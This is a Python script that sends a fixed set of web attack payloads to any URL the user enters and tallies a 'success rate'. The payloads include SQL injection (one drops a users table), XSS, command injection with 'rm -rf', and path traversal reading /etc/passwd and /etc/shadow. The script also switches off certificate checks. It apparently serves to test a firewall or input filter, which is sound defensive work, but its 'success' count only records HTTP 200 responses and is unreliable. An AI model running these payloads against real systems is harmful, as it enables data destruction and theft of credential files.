import requests
import time
import math
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress only the single InsecureRequestWarning from urllib3
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# List of attack payloads
payloads = {
    "SQL Injection": [
        "' OR 1=1 --",
        "' OR '1'='1' --",
        "' OR 'a'='a' --",
        "'; DROP TABLE users; --",
        "' OR '1'='1' /*"
    ],
    "XSS": [
        "<script>alert('XSS');</script>",
        "\"'><script>alert('XSS');</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')"
    ],
    "Command Injection": [
        "; ls",
        "&& ls",
        "| ls",
        "| ls && rm -rf",
        "$(ls && rm -rf)"
    ],
    "Path Traversal": [
        "../etc/passwd",
        "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "../../../../../etc/passwd",
        "%2e%2e%2fetc/passwd",
        "..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
    ],
    "Local File Inclusion": [
        "../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "../../../../../etc/shadow",
        "../../../../../../../../windows/system32/drivers/etc/hosts",
        "....//....//....//....//windows/win.ini"
    ],
    # Add more attack types and payloads as needed
}

# Function to perform the tests
def run_tests(url, payloads, total_duration):
    results = {attack_type: {"success": 0, "blocked": 0} for attack_type in payloads}
    start_time = time.time()
    total_payloads = sum(len(payload_list) for payload_list in payloads.values())
    delay_between_requests = total_duration / total_payloads if total_payloads > 0 else 0

    for attack_type, payload_list in payloads.items():
        for payload in payload_list:
            try:
                # Modify the request as per your application logic
                response = requests.post(url, data={"input": payload}, verify=False)
                print(f"Testing {attack_type} on {url} with payload: {payload}")
                print(f"Response Code: {response.status_code}")
                
                if response.status_code == 200:
                    results[attack_type]["success"] += 1
                else:
                    results[attack_type]["blocked"] += 1

            except Exception as e:
                print(f"An error occurred: {e}")
                results[attack_type]["blocked"] += 1

            # Ensure the test runs over the total duration
            elapsed_time = time.time() - start_time
            remaining_time = total_duration - elapsed_time
            if remaining_time > 0:
                time.sleep(min(delay_between_requests, remaining_time))

    return results

# Function to calculate and display attack success rate
def display_results(results):
    print("\nAttack Success Rate:\n")
    for attack_type, result in results.items():
        total_attempts = result["success"] + result["blocked"]
        success_rate = (result["success"] / total_attempts) * 100 if total_attempts > 0 else 0
        print(f"{attack_type}: {success_rate:.2f}% success ({result['success']} successful, {result['blocked']} blocked)")

# Prompt the user for the test URL
test_url = input("Please enter the test URL: ")

# Set duration for the test
total_duration = 30  # seconds

# Run the tests
results = run_tests(test_url, payloads, total_duration)
display_results(results)
